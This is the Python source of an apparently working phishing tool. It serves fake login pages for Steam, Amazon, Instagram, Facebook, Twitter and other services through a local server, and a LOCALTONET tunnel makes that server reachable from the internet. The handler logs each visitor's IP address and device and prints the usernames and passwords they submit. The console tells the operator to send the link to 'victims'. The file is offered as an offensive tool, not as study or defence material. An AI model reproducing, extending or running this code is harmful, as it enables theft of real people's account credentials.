from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import parse_qs, urlparse
from localtonet import LOCALTONET
from colorama import Fore, init
from threading import Thread
from time import sleep
import os
import random
import re


def choose_page():
    os.system('cls')
    social_media_names = ["Steam", "Amazon", "Snapchat", "Instagram", "EpicGames", "Nothing", 'Facebook', 'Twitter']
    social_media_position = set()
    for i, name in enumerate(social_media_names, start=1):
        social_media_position.add((i, name))
    
    while True:
        os.system('cls')
        banner = f'''{cyan}
        ┌─────────────────────────────────────────────────────────────────────────────────────────────────────┓
        ┧                                                                                                     ┧
        ┧                                        ╱╱╱╱╱╱╭╮╱╱╱╱╭╮                                               ┧
        ┧                                        ╱╱╱╱╱╱┃┃╱╱╱╱┃┃                                               ┧
        ┧                                        ╭━━┳━━┫┃╭┳━━┫┃╭━━┳━━┳━━╮                                     ┧
        ┧                                        ┃╭╮┃╭╮┃╰╯┫╭╮┃┃┃┃━┫━━┫━━┫                                     ┧
        ┧                                        ┃╭╮┃╰╯┃╭╮┫╭╮┃╰┫┃━╋━━┣━━┃                                     ┧
        ┧                                        ╰╯╰┫╭━┻╯╰┻╯╰┻━┻━━┻━━┻━━╯                                     ┧
        ┧                                        ╱╱╱┃┃                                                        ┧
        ┧                                        ╱╱╱╰╯                              v 1                       ┧
        {lc}┗────────┳────────────────────┳────────────────────┳─────────────────────┳────────────────────────────┘
                 ┧                    ┧                    ┧                     ┧
                 ┧                    ┧                    ┧                     ┧
          ┌──────{lma}1. Steam{lc}             {lma}2. Amazon{lc}            {lma}3. Snapchat{lc}           {lma}4. Instagram{lc}──────────┓
          ┧                                                                                            ┧
          ┧                                                                                            ┧
          ┗──────{lma}5. Epic Games{lc}────────{lma}6. Error{lc}─────────┳───{lma}7. Facebook{lc}───────────{lma}8. Twitter{lc}────────────┘{cyan}
                                                       ┧
                                                       ┧
                                                       ┧
                           ┌───────────────────────────┷────────────────────────────────┓
                           ┧                                                            ┧
                           ┧                                                            ┧
                           ┧         {lma}Name ⇉  Sabah{lc}                                      ┧
                           ┧         {lma}Github ⇉  https://github.com/apkaless{lc}              ┧
                           ┧                                                            ┧
                           ┗────────────────────────────────────────────────────────────┘
    '''                                                
    
        try:
            print(banner)
            social = int(input(f'\t\t\t‹ {lma}Select Target {lc}› ⇉  '))
            if social == 6:
                print('\nPlease Select An Option From The Above.')
                sleep(2)
                continue
            if social and social in [1, 2, 3 ,4 ,5 ,6 ,7 ,8]:
                media_list = list(social_media_position)
                for num in media_list:
                    if social == num[0]:
                        os.system('cls')
                        return str(num[1]).lower()
            else:
                print('\nPlease Select An Option From The Above.')
                sleep(2)
                continue
                
        except ValueError:
                print('\nPlease Select An Option From The Above.')
                sleep(3)
                continue

        except KeyboardInterrupt:
            os.system('cls')
            exit(1)

def GetCreds():
    email_pattern = r"Email:\s?[a-zA-Z0-9.-]+@+[a-zA-Z0-9-_]+\.+[a-zA-Z0-9]+"
    password_pattern = r"Password:\s?[a-zA-Z0-9.-@!#$%^&*()_+=?><,.\\/~`]+"
    api_pattern = r"API_KEY:\s?[a-zA-Z0-9.-@!#$%^&*()_+=?><,.\\/~`]+"
    creds = {}
    with open('creds.txt', 'r', encoding='utf-8') as f:
        data = f.read().strip()
        email = re.findall(email_pattern, data)
        password = re.findall(password_pattern, data)
        api = re.findall(api_pattern, data)
        if email and password and api:
            creds['email'] = email[0].split(':')[1].strip()
            creds['password'] = password[0].strip().split(':')[1].strip()
            creds['api_key'] = api[0].strip().split(':')[1].strip()
            f.close()
        else:
            print(f'{red}Invalid Creds Syntax Found')
            f.close()
            return False
        
        return creds

class handler_(SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
            pass

    def do_GET(self):
        """Serve a GET request."""
        try:
            self.index_pages = (f'{media_name}.html', f'{media_name}.html')
            f = self.send_head()
            if f:
                try:
                    self.copyfile(f, self.wfile)
                finally:
                    print(f'[🗲]🗦 Incoming Connection From {cyan}{self.address_string()}🗧\n')
                    try:
                        print(f'[🗲]🗦 Device: {cyan}{self.headers.get('User-Agent').split(';')[0].split('(')[1]}🗧\n')
                    except:
                        pass
                    queries = parse_qs(urlparse(self.path).query)
                    try:
                        print(f'{green}[🗲] User: {cyan}{queries.get('user')[0]}\n{green}[🗲] Password: {cyan}{queries.get("password")[0]}\n' if queries.get('user')[0] and queries.get('password')[0] != None else f.close())
                    except:
                        pass
                    finally:
                         f.close()

        except ConnectionAbortedError as err:
            pass

if __name__ == '__main__':
    os.system('cls')
    init(convert=True)
    red = Fore.RED
    green = Fore.GREEN
    cyan = Fore.CYAN
    lb = Fore.LIGHTBLUE_EX
    lc = Fore.LIGHTCYAN_EX
    white = Fore.WHITE
    ma = Fore.MAGENTA
    lma = Fore.LIGHTMAGENTA_EX
    res = Fore.RESET
    media_name = choose_page()
    localPath = os.getcwd()
    creds = GetCreds()
    try:
        API_KEY = f'{creds.get('api_key')}'
        EMAIL = f'{creds.get('email')}'
        PASSWORD = f'{creds.get('password')}'
        LOCALHOST = '0.0.0.0'
        SERVER_PORT = random.randint(1000, 65535)
        tolnet = LOCALTONET(EMAIL, PASSWORD, API_KEY)
        authToken = tolnet.token
        verify_token = tolnet.verifyToken
        port = str(SERVER_PORT)
        Thread(target=tolnet.launchAppThread, args=(authToken,)).start()
        response = tolnet.CreateTcpUdpTunnel(port)
        os.system('cls')
        os.chdir(localPath)
        os.chdir('pages')
        if response:
            tunnel_info = f'''{cyan}
        ┌─────────────────Server Info─────────────────┓
        ┧
        ┧ {lc}🗱  Coded By Apkaless 🗱
        ┧
        ┧ {green}Tunnel ID ➞ {lc} {response.get('ID')}
        ┧ {green}Server    ➞ {lc} http://{response.get('Server')}
        ┧ {green}Github    ➞ {lc} https://github.com/apkaless{cyan}
        ┧ {green}Version   ➞ {lc} 1
        ┧ {green}Nation    ➞ {lc} IRAQ 𐠡
        ┧
        ┗─────────────────────────────────────────────┘{res}
    '''
            print(tunnel_info)

        server = HTTPServer((LOCALHOST, SERVER_PORT), handler_)
        print(f'{lma}[🗲] Press {lc}Ctrl + C{lma} When You Finish With Your Victims\n')
        print(f'{green}[🗲] {white}Send This Link To Victims ➞  {red}http://{response.get('Server')}\n')
        print(f'{green}[🗲] Server is now listening on {cyan}{SERVER_PORT}\n')
        print(f'{green}[🗲] Waiting For Incoming Connections\n')
        server.serve_forever()
    except KeyboardInterrupt:
        os.system('cls')
        tolnet.killProcess()